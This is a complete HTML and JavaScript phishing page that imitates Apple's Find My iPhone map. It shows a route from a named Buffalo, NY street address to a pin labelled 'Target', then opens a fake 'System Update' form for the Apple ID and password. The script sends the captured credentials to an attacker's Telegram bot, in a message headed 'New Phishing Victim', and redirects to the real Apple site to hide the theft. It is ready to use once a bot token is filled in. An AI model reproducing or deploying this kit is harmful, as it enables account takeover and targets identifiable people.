<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Find My iPhone Update</title>
    
    <!-- Leaflet CSS (Map Library) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" 
          integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" 
          crossorigin=""/>

    <style>
        /* 
         * CORE RESET & VARIABLES 
         * Mimicking Apple's color palette and typography 
         */
        :root {
            --apple-blue: #007AFF;
            --apple-bg: #F2F2F7; /* Light Grey Background */
            --apple-card: #FFFFFF;
            --apple-text: #1C1C1E;
            --apple-subtext: #8E8E93;
            --apple-separator: #C6C6C8;
            --apple-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --apple-radius: 12px;
        }

        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: var(--apple-bg);
            overflow: hidden; /* Prevent scrolling, app-like feel */
        }

        /* 
         * MAP CONTAINER 
         * Needs to cover the whole screen 
         */
        #map {
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        /* Adjusting map tiles to look slightly more saturated like Apple Maps */
        .leaflet-layer {
            filter: contrast(1.05) saturate(0.9);
        }

        /* 
         * APPLE STYLE SEARCH BAR 
         * Floating at the top
         */
        .search-bar {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            height: 44px;
            background: var(--apple-card);
            border-radius: 10px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            box-shadow: var(--apple-shadow);
            z-index: 999;
        }

        .search-icon {
            color: var(--apple-subtext);
            margin-right: 10px;
            font-size: 18px;
        }

        .search-input {
            border: none;
            background: transparent;
            width: 100%;
            height: 100%;
            font-size: 17px;
            color: var(--apple-text);
            outline: none;
        }

        /* 
         * ROUTE INFO CARD 
         * Floating at the bottom
         */
        .route-card {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: var(--apple-card);
            border-radius: var(--apple-radius);
            padding: 16px;
            box-shadow: var(--apple-shadow);
            z-index: 999;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .route-info h3 {
            margin: 0 0 4px 0;
            font-size: 22px;
            color: var(--apple-text);
        }

        .route-info p {
            margin: 0;
            font-size: 15px;
            color: var(--apple-subtext);
        }

        .btn-start {
            background-color: var(--apple-blue);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 15px;
        }

        /* 
         * PHISHING MODAL (The Update Screen)
         */
        #phishing-modal {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4); /* Glassmorphism blur */
            backdrop-filter: blur(5px);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }

        #phishing-modal.active {
            opacity: 1;
            pointer-events: all;
        }

        .modal-content {
            background: var(--apple-card);
            width: 90%;
            max-width: 360px;
            border-radius: 20px;
            padding: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
            transform: scale(0.9);
            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        #phishing-modal.active .modal-content {
            transform: scale(1);
        }

        .modal-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .modal-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--apple-text);
        }

        .modal-desc {
            font-size: 16px;
            color: var(--apple-subtext);
            margin-bottom: 24px;
            line-height: 1.4;
        }

        /* 
         * FORM STYLES 
         */
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }

        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: var(--apple-subtext);
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid var(--apple-separator);
            border-radius: 10px;
            font-size: 17px;
            background: #F9F9F9;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--apple-blue);
            background: #fff;
        }

        .btn-submit {
            width: 100%;
            background: var(--apple-blue);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            margin-top: 10px;
        }

        /* Password visibility helper */
        .password-wrapper {
            position: relative;
        }
        
        .password-visibility {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--apple-blue);
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        /* Location Labels on Map */
        .custom-label {
            background: rgba(255,255,255,0.9);
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            color: #333;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

    </style>
</head>
<body>

    <!-- Apple Style Search Bar -->
    <div class="search-bar">
        <span class="search-icon">🔍</span>
        <input type="text" class="search-input" placeholder="Search" readonly>
    </div>

    <!-- THE MAP -->
    <div id="map"></div>

    <!-- Route Info Card -->
    <div class="route-card" id="route-card">
        <div class="route-info">
            <h3>20 min</h3>
            <p>Highway</p>
        </div>
        <button class="btn-start">Start</button>
    </div>

    <!-- PHISHING MODAL -->
    <div id="phishing-modal">
        <div class="modal-content">
            <div class="modal-icon">⚠️</div>
            <h2 class="modal-title">System Update</h2>
            <p class="modal-desc">To ensure your location data is secure, please verify your Apple ID details below.</p>
            
            <form id="apple-id-form">
                <div class="form-group">
                    <label class="form-label">Apple ID</label>
                    <input type="text" class="form-input" id="apple-id" placeholder="name@apple.com" required>
                </div>
                
                <div class="form-group password-wrapper">
                    <label class="form-label">Password</label>
                    <input type="text" class="form-input" id="apple-pass" placeholder="Enter password" required>
                    <span class="password-visibility">SHOW</span>
                </div>

                <button type="submit" class="btn-submit">Sign In</button>
            </form>
        </div>
    </div>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" 
            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" 
            crossorigin=""></script>

    <script>
        // ==========================================
        // CONFIGURATION
        // ==========================================
        
        // REPLACE THESE WITH YOUR TELEGRAM DETAILS
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

        // Locations
        // A: 8172 Woodview Ct, Buffalo, NY 14221
        const LOC_A = [42.9328, -78.7705]; 
        
        // B: Somewhere close (~20 mins away). Example: Clarence, NY
        // This is a coordinate roughly 20 mins drive from A
        const LOC_B = [42.9500, -78.7900]; 

        // ==========================================
        // MAP INITIALIZATION
        // ==========================================
        
        // Initialize Map
        const map = L.map('map', {
            zoomControl: false, // Hide default zoom control for cleaner look
            attributionControl: false
        }).setView(LOC_A, 14);

        // Add Tile Layer (OpenStreetMap) - Styled to look like Apple Maps
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
        }).addTo(map);

        // Add Zoom Control to bottom right (Apple style)
        L.control.zoom({
            position: 'bottomright'
        }).addTo(map);

        // ==========================================
        // MARKERS & ROUTING
        // ==========================================

        // Custom Apple-Style Icons
        const blueIcon = L.divIcon({
            className: 'custom-pin',
            html: `<div style="
                width: 30px; 
                height: 30px; 
                background: var(--apple-blue); 
                border-radius: 50% 50% 50% 0; 
                transform: rotate(-45deg); 
                display: flex; 
                align-items: center; 
                justify-content: center;
                box-shadow: 0 4px 8px rgba(0,0,0,0.3);
                border: 3px solid white;">
                <div style="
                    width: 8px; 
                    height: 8px; 
                    background: white; 
                    border-radius: 50%; 
                    transform: rotate(45deg);"></div>
            </div>`,
            iconSize: [30, 42],
            iconAnchor: [15, 42]
        });

        const redIcon = L.divIcon({
            className: 'custom-pin',
            html: `<div style="
                width: 30px; 
                height: 30px; 
                background: #FF3B30; 
                border-radius: 50% 50% 50% 0; 
                transform: rotate(-45deg); 
                display: flex; 
                align-items: center; 
                justify-content: center;
                box-shadow: 0 4px 8px rgba(0,0,0,0.3);
                border: 3px solid white;">
                <div style="
                    width: 8px; 
                    height: 8px; 
                    background: white; 
                    border-radius: 50%; 
                    transform: rotate(45deg);"></div>
            </div>`,
            iconSize: [30, 42],
            iconAnchor: [15, 42]
        });

        // Add Location A Marker (Start)
        const markerA = L.marker(LOC_A, {icon: blueIcon}).addTo(map);
        
        // Add Location B Marker (End)
        const markerB = L.marker(LOC_B, {icon: redIcon}).addTo(map);

        // Draw a Bezier Curve Line (Simulating a curved road)
        const curvePoints = [
            L.latLng(LOC_A[0], LOC_A[1]),
            L.latLng((LOC_A[0] + LOC_B[0]) / 2, (LOC_A[1] + LOC_B[1]) / 2 + 0.01), // Curve up slightly
            L.latLng(LOC_B[0], LOC_B[1])
        ];

        const curve = L.polyline(curvePoints, {
            color: varToHex('--apple-blue'),
            weight: 6,
            opacity: 0.8,
            smoothFactor: 1
        }).addTo(map);

        // Add Labels
        const labelA = L.marker(LOC_A, {icon: L.divIcon({
            html: `<div style="background:rgba(0,0,0,0.8); color:white; padding:4px 8px; border-radius:4px; font-size:10px;">You</div>`,
            className: '',
            iconSize: [60, 20],
            iconAnchor: [30, 20]
        })}).addTo(map);

        const labelB = L.marker(LOC_B, {icon: L.divIcon({
            html: `<div style="background:rgba(255,0,0,0.8); color:white; padding:4px 8px; border-radius:4px; font-size:10px;">Target</div>`,
            className: '',
            iconSize: [60, 20],
            iconAnchor: [30, 20]
        })}).addTo(map);

        // Helper to convert CSS var to hex for Leaflet
        function varToHex(v) {
            return '#007AFF'; // Hardcoded Apple Blue for Leaflet simplicity
        }

        // ==========================================
        // PHISHING LOGIC
        // ==========================================

        const modal = document.getElementById('phishing-modal');
        const form = document.getElementById('apple-id-form');
        const startBtn = document.querySelector('.btn-start');

        // Trigger the modal after 2 seconds to look natural
        setTimeout(() => {
            modal.classList.add('active');
        }, 2000);

        // Handle "Start" button click on the route card
        startBtn.addEventListener('click', () => {
            modal.classList.add('active');
        });

        // Handle Form Submission
        form.addEventListener('submit', (e) => {
            e.preventDefault();

            const appleId = document.getElementById('apple-id').value;
            const applePass = document.getElementById('apple-pass').value;

            // 1. Send to Telegram
            sendToTelegram(appleId, applePass);

            // 2. Show Success Feedback
            const modalContent = document.querySelector('.modal-content');
            modalContent.innerHTML = `
                <div class="modal-icon">✅</div>
                <h2 class="modal-title">Done</h2>
                <p class="modal-desc">Redirecting...</p>
            `;
            
            // 3. Redirect to real Apple ID page (Optional "real" button)
            setTimeout(() => {
                window.location.href = "https://appleid.apple.com";
            }, 2000);
        });

        // Telegram Integration Function
        function sendToTelegram(id, pass) {
            const message = `🎣 *New Phishing Victim*\n\n🍎 Apple ID: ${id}\n🔑 Password: ${pass}\n📍 Location: Buffalo, NY`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegram Response:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }
    </script>
</body>
</html>
